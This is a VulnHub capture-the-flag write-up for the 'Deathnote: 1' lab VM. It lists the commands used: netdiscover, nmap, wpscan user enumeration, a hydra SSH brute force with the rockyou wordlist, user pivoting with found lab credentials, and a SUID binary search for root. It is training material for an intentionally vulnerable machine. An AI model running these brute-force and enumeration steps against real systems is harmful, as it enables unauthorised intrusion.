# 🔐 Deathnote: 1 — VulnHub Write-up

## 🎯 Objective
Gain root access through enumeration, credential discovery, user pivoting, and privilege escalation.

## 🖥️ Environment
Attacker: Kali Linux <br>
Target: Deathnote 1 (VirtualBox) <br>
Network: Host-only / 192.168.56.0/24

## 🔎 Enumeration

Find Target IP:<br>
netdiscover -r 192.168.56.0/24<br>
Result:<br>
Target discovered on network

Network Scan:<br>
nmap -sS -p- <target-ip><br>
Result:<br>
22/tcp open ssh <br> 80/tcp open http

Add Host Entry:<br>
echo "<target-ip> deathnote.local" >> /etc/hosts<br>
Result:<br>
Site accessible via http://deathnote.local

Identify CMS:<br>
Visited in browser<br>
Result:<br>
WordPress site detected

WordPress Enumeration:<br>
wpscan --url http://deathnote.local --enumerate u<br>
Result:<br>
Valid username + exposed .txt files found

## 🔑 Credential Exposure

SSH Bruteforce:<br>
hydra -l L -P /usr/share/wordlists/rockyou.txt ssh://(target-ip)<br>
Result:<br>
Credentials found → L : death4me

SSH Login:
ssh L@(target-ip)<br>
Result:<br>
Initial shell obtained

Post-Login Discovery:<br>
Found Brainfuck-encoded text{used Dcode for it}<br>
Decoded using interpreter<br>
Result:<br>
New credentials → kira : kiraisevil

User Pivot:<br>
su kira<br>
password: kiraisevil<br>
Result:<br>
Privilege level increased

## 🛠️ Privilege Escalation

System Identification:<br>
uname -a | lsb_release -a<br>
Result:
Outdated Linux version detected

SUID Check:
find / -perm -4000 2>/dev/null<br>
Result:
Misconfigured SUID binary discovered

Exploit Execution:<br>
Ran vulnerable SUID binary<br>
Result:
whoami → root

## 🏁 Final Step
Challenge prompt appeared:<br>
Choice: save L or Misa
Result:
Machine completed successfully

## ✅ Final Result
Root access successfully obtained on the target.

## 📌 Lessons Learned
- Hostname resolution may be required to access web apps
- WordPress enumeration can expose usernames and files
- Hydra enables SSH access when a valid user exists
- Encoded text (Brainfuck) may hide credentials
- User pivoting can be necessary before privesc
- SUID binaries are key for escalation
